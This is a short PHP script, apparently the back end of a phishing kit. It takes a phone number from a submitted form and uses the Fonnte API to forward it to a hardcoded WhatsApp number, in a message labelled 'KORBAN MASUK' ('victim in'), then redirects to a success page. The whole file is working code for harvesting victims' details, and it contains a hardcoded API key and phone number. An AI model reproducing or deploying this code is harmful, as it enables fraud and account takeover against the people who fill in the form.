<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Ambil data dari form
    $nomor = $_POST['nomor'];

    // Tentukan nomor WhatsApp tujuan
    $phone = '083895875038';  // Nomor WhatsApp yang dituju
    $countryCode = '';  // Kode negara Indonesia

    // API Key Fonnte
    $api_key = 'HWRMWatQSKZYLJmAkbuN';  // Ganti dengan API Key Anda dari Fonnte

    // Pesan yang akan dikirim
    $fullMessage = "*( KORBAN MASUK )*\n\nNOMOR = $nomor\n\n> _@RenomMoba";

    // API URL Fonnte
    $url = 'https://api.fonnte.com/send';

    // Data yang dikirim ke API
    $data = [
        'target' => $countryCode . $phone,  // Gabungkan kode negara dengan nomor
        'message' => $fullMessage,
        'delay' => 2,  // Penundaan pengiriman pesan dalam detik (opsional)
        'countryCode' => $countryCode  // Kode negara (62 untuk Indonesia)
    ];

    // Header untuk autentikasi API
    $headers = [
        'Authorization: ' . $api_key,
        'Content-Type: application/x-www-form-urlencoded'
    ];

    // Inisialisasi cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Eksekusi dan ambil respons
    $response = curl_exec($ch);
    curl_close($ch);

    // Tampilkan hasilnya dalam format JSON
    $response_data = json_decode($response, true);
    if ($response_data && isset($response_data['status']) && $response_data['status'] == 'success') {
        // Jika sukses, alihkan ke halaman sukses
        header('Location: berhasil.php');
        exit();  // Pastikan script berhenti setelah pengalihan
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Gagal mengirim pesan.']);
    }
}
?>